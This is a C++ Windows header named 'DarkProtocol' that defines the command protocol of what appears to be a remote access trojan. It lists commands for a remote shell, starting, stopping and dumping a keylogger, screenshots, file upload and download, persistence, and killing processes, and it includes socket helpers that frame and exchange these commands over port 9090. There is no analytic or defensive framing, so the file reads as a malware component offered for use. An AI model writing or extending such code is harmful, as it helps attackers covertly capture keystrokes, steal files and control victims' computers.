#pragma once
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")

namespace DarkProtocol {

    constexpr uint16_t  PORT = 9090;
    constexpr uint32_t  CHUNK_SIZE = 8192;

    enum CommandID : uint32_t {
        CMD_SHELL = 0x01,
        CMD_KEYLOG_START = 0x02,
        CMD_KEYLOG_STOP = 0x03,
        CMD_KEYLOG_DUMP = 0x04,
        CMD_SCREENSHOT = 0x05,
        CMD_FILE_LIST = 0x06,
        CMD_FILE_DOWNLOAD = 0x07,
        CMD_FILE_UPLOAD = 0x08,
        CMD_PERSIST = 0x09,
        CMD_PROCESS_LIST = 0x0A,
        CMD_PROCESS_KILL = 0x0B,
        CMD_SYSINFO = 0x0C,
        CMD_HEARTBEAT = 0x0D,
        CMD_DISCONNECT = 0xFF,
    };

    struct PacketHeader {
        uint32_t command;
        uint32_t payloadSize;
    };

    inline bool SendAll(SOCKET s, const void* data, size_t len) {
        const char* ptr = static_cast<const char*>(data);
        size_t remaining = len;
        while (remaining > 0) {
            int sent = send(s, ptr, static_cast<int>(remaining), 0);
            if (sent == SOCKET_ERROR) return false;
            ptr += sent;
            remaining -= static_cast<size_t>(sent);
        }
        return true;
    }

    inline bool RecvAll(SOCKET s, void* data, size_t len) {
        char* ptr = static_cast<char*>(data);
        size_t remaining = len;
        while (remaining > 0) {
            int recvd = recv(s, ptr, static_cast<int>(remaining), 0);
            if (recvd <= 0) return false;
            ptr += recvd;
            remaining -= static_cast<size_t>(recvd);
        }
        return true;
    }

    inline bool SendPacket(SOCKET s, CommandID cmd, const void* payload, uint32_t payloadSize) {
        PacketHeader hdr{ static_cast<uint32_t>(cmd), payloadSize };
        if (!SendAll(s, &hdr, sizeof(hdr))) return false;
        if (payloadSize > 0) {
            if (!SendAll(s, payload, payloadSize)) return false;
        }
        return true;
    }

    inline bool SendPacket(SOCKET s, CommandID cmd, const std::string& payload) {
        return SendPacket(s, cmd, payload.data(), static_cast<uint32_t>(payload.size()));
    }

    inline bool RecvPacket(SOCKET s, CommandID& outCmd, std::string& outPayload) {
        PacketHeader hdr{};
        if (!RecvAll(s, &hdr, sizeof(hdr))) return false;
        outCmd = static_cast<CommandID>(hdr.command);
        outPayload.clear();
        if (hdr.payloadSize > 0) {
            outPayload.resize(hdr.payloadSize);
            if (!RecvAll(s, outPayload.data(), hdr.payloadSize)) return false;
        }
        return true;
    }

} // namespace DarkProtocol